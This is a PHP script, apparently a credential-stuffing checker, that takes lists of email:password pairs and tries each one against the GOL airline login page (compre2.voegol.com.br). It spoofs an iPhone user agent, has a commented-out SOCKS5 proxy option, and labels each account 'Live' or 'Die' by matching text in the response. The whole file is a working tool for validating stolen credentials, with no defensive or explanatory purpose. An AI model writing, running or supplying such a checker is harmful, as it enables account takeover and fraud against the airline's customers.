<?php
require ('./class_curl.php');

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}


if ($_POST['do'] == 'check')
{

    $curl = new curl();
    delete_cookies();
    $curl->ua('Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16');
 

    $result = array();
    $delim = urldecode($_POST['delim']);
    list($email, $pwd) = explode($delim, urldecode($_POST['mailpass']));
//   $sock = urldecode($_POST['IP']);

    if (!$email)
    {
        $result['error'] = -1;
        $result['msg'] = urldecode($_POST['mailpass']);
        echo json_encode($result);
        exit;
    }
    
    delete_cookies();
 //  $curl->sock5($sock);

	if($curl->validate()){
		$fullink='https://compre2.voegol.com.br/Login2.aspx?__EVENTTARGET=LoginMemberLogin2View%24LinkButtonLogIn&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUBMGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFKFJlZ2lzdGVyTG9naW4yVmlldyRDaGVja0JveEZyZXF1ZW50Rmx5ZXJDeNPBv5S1XFgfJUvZKqZFDhcruw%3D%3D&pageToken=&LoginMemberLogin2View%24TextBoxUserID='.$email.'&LoginMemberLogin2View%24PasswordFieldPassword='.$pwd.'&LoginMemberLogin2View%24resetPasswordUserId=&RegisterLogin2View%24userFirstName=&RegisterLogin2View%24userLastName=&RegisterLogin2View%24birthdayDate=&RegisterLogin2View%24userGender=male&RegisterLogin2View%24userDocument=cpf&RegisterLogin2View%24cpfField=&RegisterLogin2View%24userDocuments=RG&RegisterLogin2View%24otherDocumentField=&RegisterLogin2View%24email=&RegisterLogin2View%24emailConfirm=&RegisterLogin2View%24password=&RegisterLogin2View%24passwordConfirm=';
		$curl->page($fullink);
		
		if($curl->validate()){
		
		
		
			 
			 if(stripos($curl->content, 'Número GOL') !== false){
			 	$result['error'] = 0;
				$result['msg'] = '<b style="color:yellow;">Live</b> => ' . $sock . ' | ' . $email .
                        ' | ' .$pwd.'|www.technologychecker.us'; 

			 }
			 elseif(stripos($curl->content, 'A senha que você inseriu não está correta para seu login de acesso. Por favor, verifique se a tecla Caps Lock do seu teclado não está ativada e tente de novo.') !== false){
			 
				$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Die</b> => ' . $email . ' | ' . $pwd.' | Checked'; 

			 }
			
			 else{
			 
					 
			 	$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">DIE</b> => ' . $email . ' | ' . $pwd.' | Ckecked'; 
			 }
			
							
		}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
		}	
		
	
	
	}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
	}
	
	

    echo json_encode($result);
    exit;

}

?>